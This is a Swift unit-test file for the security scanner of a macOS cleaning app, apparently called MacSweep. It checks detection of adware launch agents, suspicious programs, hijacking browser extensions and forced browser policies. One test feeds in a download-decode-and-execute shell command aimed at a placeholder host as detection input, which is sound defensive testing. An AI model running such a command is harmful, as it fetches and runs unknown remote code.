import XCTest
@testable import MacSweep

final class SecurityTests: XCTestCase {
    private func launchItem(_ label: String, program: String?, arguments: [String] = [], user: Bool = true) -> LaunchItem {
        LaunchItem(url: URL(fileURLWithPath: "/Users/me/Library/LaunchAgents/\(label).plist"), label: label,
                   program: program, arguments: arguments, runAtLoad: true, isUserItem: user)
    }

    private func check(_ item: LaunchItem, existing: Set<String> = [], signature: CodeSignature = .developer(team: "T"))
        -> SecurityFinding? {
        SecurityScanner.check(item, fileExists: { existing.contains($0) }, signature: { _ in signature })
    }

    // Known adware / PUPs

    func testSignaturesMatchKnownFamiliesButNotLookalikes() {
        XCTAssertEqual(AdwareSignature.match(["com.pcv.amc.agent"])?.family, "PCVARK (Advanced Mac Cleaner, Mac Tonic)")
        XCTAssertEqual(AdwareSignature.match(["MacKeeper Helper"])?.isAdware, false)
        XCTAssertEqual(AdwareSignature.match([nil, "com.genieo.completer"])?.isAdware, true)
        XCTAssertNil(AdwareSignature.match(["com.google.Chrome", "Slack", "SpigotMC Server"]))
    }

    // Launch items

    func testKnownAdwareLaunchAgentIsAThreat() {
        let finding = check(launchItem("com.pirrit.agent", program: "/Users/me/Library/pirrit/agent"))
        XCTAssertEqual(finding?.category, .threat)
        guard case .trash(_, unload: true)? = finding?.action else { return XCTFail("user agents are removable") }
    }

    func testFakeAppleAgentIsSuspicious() {
        let finding = check(launchItem("com.apple.updater", program: "/Users/me/Library/Application Support/x/run"),
                            existing: ["/Users/me/Library/Application Support/x/run"])
        XCTAssertEqual(finding?.category, .suspicious)
        XCTAssertTrue(finding?.reasons.first?.contains("Apple name") == true)
    }

    func testDownloaderAndEncodedCommandsAreSuspicious() {
        let item = launchItem("com.updater", program: "/bin/sh",
                              arguments: ["/bin/sh", "-c", "curl -s https://x.example | base64 -D | sh"])
        let reasons = check(item)?.reasons ?? []
        XCTAssertEqual(check(item)?.category, .suspicious)
        XCTAssertTrue(reasons.contains { $0.contains("Downloads") })
        XCTAssertTrue(reasons.contains { $0.contains("encoded") })
    }

    func testProgramsInHiddenOrTemporaryFoldersAreSuspicious() {
        XCTAssertEqual(check(launchItem("a", program: "/Users/me/.hidden/run"), existing: ["/Users/me/.hidden/run"])?.category,
                       .suspicious)
        XCTAssertEqual(check(launchItem("b", program: "/private/tmp/run"), existing: ["/private/tmp/run"])?.category,
                       .suspicious)
    }

    func testBrokenSignatureIsSuspicious() {
        let program = "/Applications/Tool.app/Contents/MacOS/helper"
        XCTAssertEqual(check(launchItem("com.tool.helper", program: program), existing: [program], signature: .invalid)?.category,
                       .suspicious)
        XCTAssertNil(check(launchItem("com.tool.helper", program: program), existing: [program], signature: .unsigned),
                     "unsigned alone isn't enough to call a launch agent suspicious")
    }

    func testLeftoverAgentForARemovedAppIsBloat() {
        let finding = check(launchItem("com.gone.app", program: "/Applications/Gone.app/Contents/MacOS/Gone"))
        XCTAssertEqual(finding?.category, .bloatware)
    }

    func testNormalAgentsAreNotFlagged() {
        let program = "/Applications/Dropbox.app/Contents/MacOS/Dropbox"
        XCTAssertNil(check(launchItem("com.dropbox.agent", program: program), existing: [program]))
        XCTAssertNil(check(launchItem("homebrew.mxcl.postgresql", program: "/usr/bin/true"), existing: ["/usr/bin/true"]))
    }

    func testSystemWideItemsCanOnlyBeRevealed() {
        let item = LaunchItem(url: URL(fileURLWithPath: "/Library/LaunchDaemons/com.genieo.daemon.plist"),
                              label: "com.genieo.daemon", program: nil, runAtLoad: true, isUserItem: false)
        let finding = check(item)
        XCTAssertEqual(finding?.kind, "Launch daemon")
        XCTAssertEqual(finding?.isRemovable, false)
    }

    // Apps

    private let now = Date(timeIntervalSince1970: 1_800_000_000)
    private func app(_ name: String, _ id: String) -> AppInfo {
        AppInfo(url: URL(fileURLWithPath: "/Applications/\(name).app"), name: name, bundleID: id, version: "1")
    }

    func testAppChecks() {
        let recent = now.addingTimeInterval(-10 * 86_400)
        let stale = now.addingTimeInterval(-400 * 86_400)
        let dev = CodeSignature.developer(team: "T")

        XCTAssertEqual(SecurityScanner.check(app: app("MacKeeper", "com.mackeeper.MacKeeper"), lastUsed: recent,
                                             signature: dev, now: now)?.category, .threat)
        XCTAssertEqual(SecurityScanner.check(app: app("Tool", "com.tool"), lastUsed: recent, signature: .invalid,
                                             now: now)?.category, .suspicious)
        XCTAssertNil(SecurityScanner.check(app: app("Slack", "com.tinyspeck.slackmacgap"), lastUsed: recent,
                                           signature: dev, now: now))

        let unused = SecurityScanner.check(app: app("Old", "com.old"), lastUsed: stale, signature: dev, now: now)
        XCTAssertEqual(unused?.category, .bloatware)
        XCTAssertEqual(unused?.reasons.first, "Not used in over a year.")
        XCTAssertEqual(SecurityScanner.check(app: app("Never", "com.never"), lastUsed: nil, signature: dev, now: now)?
            .reasons.first, "No sign it has ever been opened.")

        let garageBand = SecurityScanner.check(app: app("GarageBand", "com.apple.garageband10"), lastUsed: stale,
                                               signature: .apple, now: now)
        XCTAssertTrue(garageBand?.reasons.contains { $0.contains("App Store") } == true)
    }

    func testLastUsedFallsBackToTheAppsOwnData() throws {
        let temp = try TempDir()
        let app = app("Zoom", "us.zoom.xos")
        XCTAssertNil(SecurityScanner.lastUsedDate(app, library: temp.url), "no Spotlight date and no data")
        let prefs = try temp.file("Preferences/us.zoom.xos.plist")
        let used = Date(timeIntervalSince1970: 1_790_000_000)
        try FileManager.default.setAttributes([.modificationDate: used], ofItemAtPath: prefs.path)
        XCTAssertEqual(SecurityScanner.lastUsedDate(app, library: temp.url), used)
    }

    func testDescribeDays() {
        XCTAssertEqual(SecurityScanner.describe(days: 200), "6 months")
        XCTAssertEqual(SecurityScanner.describe(days: 400), "over a year")
        XCTAssertEqual(SecurityScanner.describe(days: 800), "over 2 years")
    }

    // Code signatures

    func testCodeSignatureCheck() throws {
        XCTAssertEqual(CodeSignature.check(URL(fileURLWithPath: "/bin/ls")), .apple)
        let temp = try TempDir()
        let script = try temp.file("run.sh", data: Data("#!/bin/sh\necho hi\n".utf8))
        XCTAssertEqual(CodeSignature.check(script), .unsigned)
    }

    // Browsers

    func testExtensionsThatHijackSearchOrMatchAdwareAreFlagged() throws {
        let temp = try TempDir()
        let profile = "Google/Chrome/Default/Extensions"
        try temp.file("\(profile)/aaa/1.0_0/manifest.json", data: Data("""
            {"name": "__MSG_appName__", "default_locale": "en",
             "chrome_settings_overrides": {"search_provider": {"search_url": "https://search.example/?q={searchTerms}"}}}
            """.utf8))
        try temp.file("\(profile)/aaa/1.0_0/_locales/en/messages.json",
                      data: Data(#"{"APPNAME": {"message": "Search Plus"}}"#.utf8))
        try temp.file("\(profile)/bbb/2.1_0/manifest.json", data: Data(#"{"name": "SearchBaron Helper"}"#.utf8))
        try temp.file("\(profile)/bbb/1.0_0/manifest.json", data: Data(#"{"name": "Old version"}"#.utf8))
        try temp.file("\(profile)/ccc/3.0_0/manifest.json", data: Data(#"{"name": "uBlock Origin"}"#.utf8))

        let findings = SecurityScanner.extensionFindings(support: temp.url)
        let byTitle = Dictionary(uniqueKeysWithValues: findings.map { ($0.title, $0) })
        XCTAssertEqual(Set(byTitle.keys), ["Search Plus", "SearchBaron Helper"], "uses the latest version and localized name")
        XCTAssertEqual(byTitle["Search Plus"]?.category, .suspicious)
        XCTAssertEqual(byTitle["SearchBaron Helper"]?.category, .threat)
        XCTAssertEqual(byTitle["Search Plus"]?.kind, "Chrome extension (Default)")
        XCTAssertEqual(byTitle["Search Plus"]?.isRemovable, false)
    }

    func testForcedBrowserPoliciesAreFlagged() throws {
        let temp = try TempDir()
        let policy: NSDictionary = ["HomepageLocation": "https://hijack.example", "ExtensionInstallForcelist": ["x;y"]]
        policy.write(to: temp.url.appendingPathComponent("com.google.Chrome.plist"), atomically: true)
        NSDictionary(dictionary: ["SomethingElse": true])
            .write(to: temp.url.appendingPathComponent("com.brave.Browser.plist"), atomically: true)

        let findings = SecurityScanner.policyFindings(locations: [temp.url])
        XCTAssertEqual(findings.map(\.title), ["Chrome settings are locked by a policy"])
        XCTAssertTrue(findings[0].reasons[0].contains("installs extensions you can't remove"))
        XCTAssertTrue(findings[0].reasons[0].contains("sets your homepage"))
    }
}
